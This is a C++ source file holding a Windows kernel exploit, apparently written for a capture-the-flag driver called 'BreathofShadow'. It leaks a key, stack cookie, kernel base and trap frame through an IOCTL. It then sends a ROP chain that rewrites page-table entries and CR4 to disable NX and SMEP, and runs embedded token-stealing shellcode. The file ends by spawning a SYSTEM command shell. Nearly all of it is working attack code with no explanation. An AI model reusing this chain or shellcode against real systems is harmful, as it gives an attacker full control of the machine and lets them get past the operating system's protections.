#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <string.h>
#include <process.h>

#pragma comment(lib,"ntdll.lib")
#define SIOCTL_TYPE 40000

#define IOCTL(Function) CTL_CODE( SIOCTL_TYPE, Function, METHOD_NEITHER, FILE_ANY_ACCESS  )

#define wszDrive "\\\\.\\BreathofShadow"

void getshell() {
	STARTUPINFO si = { sizeof(STARTUPINFO) };
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	printf("GO\n");
	printf("fuck");
	system("C:\\Windows\\System32\\cmd.exe");
	printf("fuck");
}


void* shellcode() {
	void* lpAddress = NULL;
	char sc[] = "eL\x8b\x0c%\x88\x01\x00\x00I\x89\xc4M\x89\xca\x66\x41\xc7\x81\xe4\x01\x00\x00\x00\x00M\x8b\x89 \x02\x00\x00L\x89\xc8H\x89\xc1H\x8d\x89`\x03\x00\x00L\x89\xc8H\x8b\x80\xf0\x02\x00\x00H\x8d\x80\x10\xfd\xff\xff\x66\x83\xb8\xe8\x02\x00\x00\x04u\xe8H\x89\xc2H\x8d\x92`\x03\x00\x00H\x8b\x12H\x89\x11I\xc7\xc3\x02\x02\x00\x00L\x89\xe1H\xc7\xc2\x8a\x00\x00\x00H1\xf6H1\xff\xc3";
	void* addr = NULL;
	addr = VirtualAlloc(lpAddress, 0x3000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);


	printf("\t[+]Shellcode buffer allocated at: 0x%p", addr);

	memmove(addr, sc, sizeof(sc));
	memset((void*)((size_t)addr + 0x1000), 'A', 1);
	return addr;
}
int main()
{
	setvbuf(stdout, NULL, _IONBF, 0);
	NTSTATUS status;
	ULONG i;
	HANDLE hDevice;

	PVOID map;
	size_t* stack;
	map = shellcode();
	stack = (size_t*)VirtualAlloc(NULL, 0x10000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	memset(stack, 'A', 0x10000);

	hDevice = CreateFileA(wszDrive,          // drive to open
		GENERIC_READ,                // no access to the drive
		FILE_SHARE_READ,
		NULL,             // default security attributes
		OPEN_EXISTING,    // disposition
		FILE_ATTRIBUTE_NORMAL,                // file attributes
		NULL);
	if (hDevice == INVALID_HANDLE_VALUE) {
		std::cout << "no device" << std::endl;

		exit(0);
	}

	DWORD dwbyte;
	DWORD cmd;
	BOOL bResult = false;
	size_t inputbuf[0x300] = { 0 };
	size_t size = 0;
	size_t kaddr = 0;
	size_t key = 0;
	size_t cookie = 0;
	size_t trapframe = 0;
	cmd = IOCTL(0x902);
	size = 0x20;
	bResult = DeviceIoControl(hDevice, cmd, inputbuf, size, NULL, 0x300, &dwbyte, NULL);
	key = inputbuf[0];
	cookie = inputbuf[0x20];
	kaddr = inputbuf[51] - 0x5e8345-0x1040-0x70;
	trapframe = inputbuf[52];

	printf("key: 0x%p\n", key);
	printf("cookie: 0x%p\n", cookie);
	printf("base: 0x%p\n", kaddr);
	printf("trap: 0x%p\n", trapframe);



	size_t pop_rcx = kaddr + 0x40df4;
	size_t value = 0x70678;
	size_t baseidx = 0;
	size_t mov_cr4_ecx = kaddr + 0x17ae47; //mov cr4,rcx,ret
	size_t mov_drcx_edx = kaddr + 0x81219;
	size_t getpte = kaddr + 0xbadc8; //MiGetPTEaddress
	size_t pop_rdx = kaddr + 0x80f582;
	size_t add_rax_rdx = kaddr + 0x80f4b;
	size_t mov_rcx_rax = kaddr + 0x28df80; //mov rcx, rax ; mov rsi, qword [rsp+0x40] ; mov rax, rcx ; add rsp, 0x30 ; pop rdi ; ret
	size_t kisysret = kaddr + 0x351d8e; //KiSystemServiceExit
	size_t pop_rbp = kaddr + 0x86d0c7;
	size_t pop_r8 = kaddr + 0x12c8cf;

	size_t systemserviceexit = kaddr + 0x1d2b15;




	baseidx = 0x25;

	
	inputbuf[baseidx++] = pop_rcx;
	inputbuf[baseidx++] = (size_t)map;
	inputbuf[baseidx++] = getpte; //pte
	inputbuf[baseidx++] = mov_rcx_rax;

	for (int i = 0; i < 7; i++)
		inputbuf[baseidx++] = 0;
	inputbuf[baseidx++] = getpte; //pd
	inputbuf[baseidx++] = mov_rcx_rax;

	for (int i = 0; i < 7; i++)
		inputbuf[baseidx++] = 0;

	inputbuf[baseidx++] = getpte; //pdpt
	inputbuf[baseidx++] = mov_rcx_rax;

	for (int i = 0; i < 7; i++)
		inputbuf[baseidx++] = 0;

	inputbuf[baseidx++] = getpte;//pml4
	inputbuf[baseidx++] = pop_rdx;
	inputbuf[baseidx++] = 7;
	inputbuf[baseidx++] = add_rax_rdx;
	inputbuf[baseidx++] = mov_rcx_rax;

	for (int i = 0; i < 7; i++)
		inputbuf[baseidx++] = 0;
	inputbuf[baseidx++] = pop_rdx;
	inputbuf[baseidx++] = 0x0a; //clear NX
	inputbuf[baseidx++] = mov_drcx_edx;
	
	inputbuf[baseidx++] = pop_rcx;
	inputbuf[baseidx++] = value;
	inputbuf[baseidx++] = mov_cr4_ecx;

	inputbuf[baseidx++] = (size_t)map;

	inputbuf[baseidx++] = mov_drcx_edx; //fixed pml4

	inputbuf[baseidx++] = pop_rbp;
	inputbuf[baseidx++] = trapframe;
	inputbuf[baseidx++] = systemserviceexit;

	for (int i = 0; i < baseidx; i++) {
		inputbuf[i] ^= key;
	}
	size = 0x300;

	bResult = DeviceIoControl(hDevice, cmd, inputbuf, size, NULL, 42, &dwbyte, NULL);
	getshell();



	return 0;

}

